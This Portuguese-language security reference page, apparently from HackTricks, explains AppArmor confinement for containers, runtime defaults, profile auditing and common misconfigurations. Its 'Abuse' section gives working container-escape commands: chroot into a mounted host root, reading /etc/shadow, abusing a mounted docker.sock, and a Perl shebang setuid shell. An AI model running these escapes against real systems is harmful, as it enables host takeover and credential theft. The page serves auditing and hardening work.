# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão Geral

AppArmor é um sistema de **Controle de Acesso Obrigatório** que aplica restrições por meio de perfis por-programa. Diferente das verificações DAC tradicionais, que dependem fortemente da propriedade de usuário e grupo, o AppArmor permite que o kernel imponha uma política anexada ao próprio processo. Em ambientes de container, isso importa porque uma workload pode ter privilégios tradicionais suficientes para tentar uma ação e ainda assim ser negada porque seu perfil do AppArmor não permite o caminho, montagem, comportamento de rede ou uso de capability relevante.

O ponto conceitual mais importante é que o AppArmor é **baseado em caminhos**. Ele raciocina sobre o acesso ao sistema de arquivos por meio de regras de caminho em vez de rótulos, como o SELinux faz. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts alternativos de caminhos merecem atenção cuidadosa. Se o mesmo conteúdo do host se tornar alcançável sob um caminho diferente, o efeito da política pode não ser o que o operador esperava originalmente.

## Papel no isolamento de containers

Revisões de segurança de container muitas vezes param nas capabilities e seccomp, mas o AppArmor continua a ser importante após essas verificações. Imagine um container que tem mais privilégio do que deveria, ou uma workload que precisou de uma capability extra por motivos operacionais. O AppArmor ainda pode restringir acesso a arquivos, comportamento de montagem, rede e padrões de execução de maneiras que interrompem o caminho óbvio de abuso. Por isso desabilitar o AppArmor "só para fazer a aplicação funcionar" pode transformar silenciosamente uma configuração apenas arriscada em uma que é ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver sob qual usuário o processo atual do container está sendo executado:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
A diferença é instrutiva. No caso normal, o processo deve mostrar um contexto AppArmor vinculado ao perfil escolhido pelo runtime. No caso unconfined, essa camada extra de restrição desaparece.

Você também pode inspecionar o que o Docker acha que aplicou:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso em tempo de execução

Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host o suporta. Podman também pode integrar-se com AppArmor em sistemas baseados em AppArmor, embora em distribuições com SELinux como prioridade o outro sistema MAC frequentemente ganhe protagonismo. Kubernetes pode expor políticas AppArmor a nível de workload em nós que realmente suportem AppArmor. LXC e ambientes de system-container da família Ubuntu também usam AppArmor extensivamente.

O ponto prático é que AppArmor não é um recurso "do Docker". É um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não o suporta ou se o runtime é instruído a rodar unconfined, a suposta proteção não existe realmente.

Para o Kubernetes especificamente, a API moderna é `securityContext.appArmorProfile`. Desde o Kubernetes `v1.30`, as antigas anotações beta do AppArmor estão obsoletas. Em hosts que suportam, `RuntimeDefault` é o perfil padrão, enquanto `Localhost` aponta para um perfil que já deve estar carregado no node. Isso importa durante a revisão porque um manifest pode parecer consciente do AppArmor enquanto ainda depende inteiramente do suporte no lado do node e de perfis pré-carregados.

Um detalhe operacional sutil mas útil é que definir explicitamente `appArmorProfile.type: RuntimeDefault` é mais restritivo do que simplesmente omitir o campo. Se o campo for definido explicitamente e o node não suportar AppArmor, a admissão deve falhar. Se o campo for omitido, o workload ainda pode rodar em um node sem AppArmor e simplesmente não receber essa camada extra de confinamento. Do ponto de vista de um atacante, isso é uma boa razão para checar tanto o manifest quanto o estado real do node.

Em hosts AppArmor com suporte a Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que alguns capability-based PoCs ainda falham em um container padrão. Em termos gerais, `docker-default` permite networking comum, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount, e restringe ptrace para que não seja um primitivo geral de sondagem do host. Entender essa linha de base ajuda a distinguir "o container tem `CAP_SYS_ADMIN`" de "o container pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de perfis

Perfis do AppArmor normalmente são armazenados em `/etc/apparmor.d/`. Uma convenção comum de nomenclatura é substituir barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` geralmente é armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe importa tanto na defesa quanto na avaliação porque, uma vez que você saiba o nome do perfil ativo, frequentemente pode localizar o arquivo correspondente rapidamente no host.

Comandos úteis de gerenciamento no host incluem:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
A razão pela qual esses comandos importam em uma referência de container-security é que eles explicam como os perfis são realmente construídos, carregados, alternados para complain mode e modificados após mudanças na aplicação. Se um operador costuma mover perfis para complain mode durante troubleshooting e esquecer de restaurar enforcement, o container pode parecer protegido na documentação enquanto se comporta de forma muito mais frouxa na prática.

### Building And Updating Profiles

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` pode gerar um perfil de modelo que pode ser carregado posteriormente com `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permitir ou negá-las:
```bash
sudo aa-logprof
```
### Logs

As negações do AppArmor costumam ser visíveis via `auditd`, syslog ou ferramentas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Isso é útil operacionalmente e ofensivamente. Defensores o usam para refinar perfis. Atacantes o usam para descobrir qual caminho ou operação exata está sendo negada e se o AppArmor é o controle que está bloqueando uma cadeia de exploração.

### Identificando o Arquivo de Perfil Exato

Quando um runtime mostra um nome de perfil AppArmor específico para um container, muitas vezes é útil mapear esse nome de volta para o arquivo de perfil no disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Isto é especialmente útil durante a revisão no host porque preenche a lacuna entre "o container diz que está rodando sob o perfil `lowpriv`" e "as regras reais residem neste arquivo específico que pode ser auditado ou recarregado".

### Regras mais importantes para auditar

Quando você consegue ler um perfil, não pare nas simples linhas `deny`. Vários tipos de regra mudam materialmente quão útil o AppArmor será contra uma tentativa de container escape:

- `ux` / `Ux`: executa o binário alvo sem confinement. Se um helper, shell, or interpreter acessível for permitido sob `ux`, isso geralmente é a primeira coisa a testar.
- `px` / `Px` and `cx` / `Cx`: realizam transições de perfil no exec. Não são automaticamente ruins, mas valem a auditoria porque uma transição pode cair em um perfil muito mais amplo do que o atual.
- `change_profile`: permite que uma task mude para outro perfil carregado, imediatamente ou no próximo exec. Se o perfil de destino for mais fraco, isso pode se tornar a rota de escape pretendida de um domínio restritivo.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: isto deve alterar o nível de confiança que você deposita no perfil. `complain` registra denials em vez de aplicá-las, `unconfined` remove a boundary, e `prompt` depende de um caminho de decisão em userspace em vez de uma negação imposta puramente pelo kernel.
- `userns` or `userns create,`: políticas mais recentes do AppArmor podem mediar a criação de user namespaces. Se um perfil de container permitir explicitamente, nested user namespaces permanecem possíveis mesmo quando a plataforma usa AppArmor como parte de sua estratégia de hardening.

Grep útil no host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Esse tipo de auditoria costuma ser mais útil do que ficar olhando centenas de regras de arquivos comuns. Se uma fuga depender de executar um helper, entrar em um novo namespace, ou escapar para um profile menos restritivo, a resposta frequentemente está escondida nessas regras orientadas à transição em vez das linhas óbvias do tipo `deny /etc/shadow r`.

## Misconfigurações

O erro mais óbvio é `apparmor=unconfined`. Administradores frequentemente o definem enquanto depuram uma aplicação que falhou porque o profile bloqueou corretamente algo perigoso ou inesperado. Se o flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é presumir que bind mounts são inofensivos porque as permissões de arquivo parecem normais. Como AppArmor é baseado em caminhos, expor host paths sob locais alternativos de mount pode interagir mal com as regras de caminho. Um terceiro erro é esquecer que um profile name num arquivo de configuração significa muito pouco se o kernel do host não estiver realmente aplicando o AppArmor.

## Abuse

Quando o AppArmor não existe, operações que antes eram restringidas podem de repente funcionar: ler caminhos sensíveis através de bind mounts, acessar partes de procfs ou sysfs que deveriam ser mais difíceis de usar, executar ações relacionadas a mount se capabilities/seccomp também as permitirem, ou usar caminhos que um profile normalmente negaria. AppArmor é frequentemente o mecanismo que explica por que uma tentativa de breakout baseada em capabilities "should work" no papel mas ainda falha na prática. Remova o AppArmor, e a mesma tentativa pode começar a ter sucesso.

Se você suspeita que o AppArmor é o principal impedimento para uma cadeia de abuso baseada em path-traversal, bind-mount, ou mount, o primeiro passo normalmente é comparar o que se torna acessível com e sem um profile. Por exemplo, se um host path está montado dentro do container, comece verificando se você pode percorrê-lo e lê-lo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se o container também tiver uma capability perigosa como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de mount ou o acesso a sistemas de arquivos sensíveis do kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Em ambientes onde um host path já está disponível através de um bind mount, a perda do AppArmor também pode transformar um problema de divulgação de informações somente leitura em acesso direto a arquivos do host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
O objetivo desses comandos não é que o AppArmor, por si só, crie o breakout. É que, uma vez que o AppArmor é removido, muitos filesystem and mount-based abuse paths são imediatamente testáveis.

### Exemplo completo: AppArmor Disabled + Host Root Mounted

Se o container já tem o host root bind-mounted em `/host`, remover o AppArmor pode transformar um blocked filesystem abuse path em um complete host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Uma vez que o shell está sendo executado através do host filesystem, a workload efetivamente escapou do container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Exemplo completo: AppArmor desativado + Runtime Socket

Se a barreira real era o AppArmor em torno do estado de runtime, um socket montado pode ser suficiente para um escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: AppArmor não impede mais o acesso à runtime API, e a runtime API pode lançar um container que compromete o host.

### Full Example: Path-Based Bind-Mount Bypass

Como o AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo procfs do host quando ele é acessível por um caminho diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
O impacto depende do que exatamente está montado e se o caminho alternativo também contorna outros controles, mas esse padrão é um dos motivos mais claros pelos quais o AppArmor deve ser avaliado em conjunto com o layout de montagem em vez de isoladamente.

### Exemplo completo: Shebang Bypass

A política do AppArmor às vezes direciona um caminho de intérprete de modo que não considera completamente a execução de scripts via shebang. Um exemplo histórico envolveu usar um script cuja primeira linha aponta para um intérprete confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Esse tipo de exemplo é importante como lembrete de que a intenção do profile e a semântica real de execução podem divergir. Ao revisar AppArmor em ambientes de container, interpreter chains e alternate execution paths merecem atenção especial.

## Verificações

O objetivo dessas verificações é responder rapidamente a três perguntas: o AppArmor está ativado no host, o processo atual está confinado, e o runtime realmente aplicou um profile a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
O que é interessante aqui:

- Se `/proc/self/attr/current` mostra `unconfined`, a workload não está se beneficiando do confinamento AppArmor.
- Se `aa-status` mostra AppArmor disabled ou not loaded, qualquer nome de profile na runtime config é, na prática, mais cosmético.
- Se `docker inspect` mostra `unconfined` ou um profile customizado inesperado, isso frequentemente explica porque um caminho de abuso baseado em filesystem ou mounts funciona.
- Se `/sys/kernel/security/apparmor/profiles` não contém o profile que você esperava, a configuração do runtime ou do orquestrador não é suficiente por si só.
- Se um profile supostamente hardened contém `ux`, regras amplas `change_profile`, `userns`, ou estilos `flags=(complain)`, o limite prático pode ser muito mais fraco do que o nome do profile sugere.

Se um container já tem privilégios elevados por razões operacionais, deixar AppArmor ativado frequentemente faz a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Para AppArmor, a variável mais importante costuma ser o **host**, não apenas o runtime. Uma configuração de profile em um manifest não cria confinamento em um nó onde AppArmor não está habilitado.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
